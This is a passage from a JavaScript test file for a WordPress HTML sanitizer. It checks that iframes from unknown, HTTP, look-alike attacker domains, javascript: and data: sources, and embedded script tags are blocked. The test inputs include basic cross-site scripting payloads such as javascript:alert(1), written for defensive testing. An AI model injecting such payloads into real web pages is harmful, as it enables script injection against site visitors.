        const html = '<iframe src="https://unknown.com/embed"></iframe>';
        const result = sanitizeWordPressHtml(html);
        expect(result).not.toContain('src="https://unknown.com/embed"');
        expect(result).toContain('blocked-embed');
      });

      it('should block iframes with HTTP (non-HTTPS)', () => {
        const html = '<iframe src="http://www.youtube.com/embed/abc"></iframe>';
        const result = sanitizeWordPressHtml(html);
        // HTTP is not in allowedSchemesByTag.iframe (only https)
        expect(result).not.toContain('src="http://www.youtube.com/embed/abc"');
      });

      it('should block iframes from subdomains that look like allowed domains', () => {
        const html = '<iframe src="https://evil.youtube.com.attacker.com/embed"></iframe>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('blocked-embed');
      });

      it('should block iframes with javascript: src', () => {
        const html = '<iframe src="javascript:alert(1)"></iframe>';
        const result = sanitizeWordPressHtml(html);
        expect(result).not.toContain('javascript:');
      });

      it('should block iframes with data: src', () => {
        const html = '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>';
        const result = sanitizeWordPressHtml(html);
        expect(result).not.toContain('data:');
      });

      it('should block iframes with invalid URLs', () => {
        const html = '<iframe src="not-a-valid-url"></iframe>';
        const result = sanitizeWordPressHtml(html);
        // Invalid URL should be blocked
        expect(result).toContain('blocked-embed');
      });

      it('should block iframes with empty src', () => {
        const html = '<iframe src=""></iframe>';
        const result = sanitizeWordPressHtml(html);
        // Empty src is invalid
        expect(result).toContain('blocked-embed');
      });
    });
  });
});

// ============================================================
// SANITIZE BLOCK HTML TESTS
// Tests for the convenience wrapper function
// ============================================================

describe('sanitizeBlockHtml', () => {
  it('should work identically to sanitizeWordPressHtml', () => {
    const html = '<p>Test content</p><script>alert(1)</script>';
    const wpResult = sanitizeWordPressHtml(html);
    const blockResult = sanitizeBlockHtml(html);
    expect(blockResult).toBe(wpResult);
  });

  it('should handle null input', () => {
    expect(sanitizeBlockHtml(null)).toBe('');
  });

  it('should handle undefined input', () => {
    expect(sanitizeBlockHtml(undefined)).toBe('');
  });
});
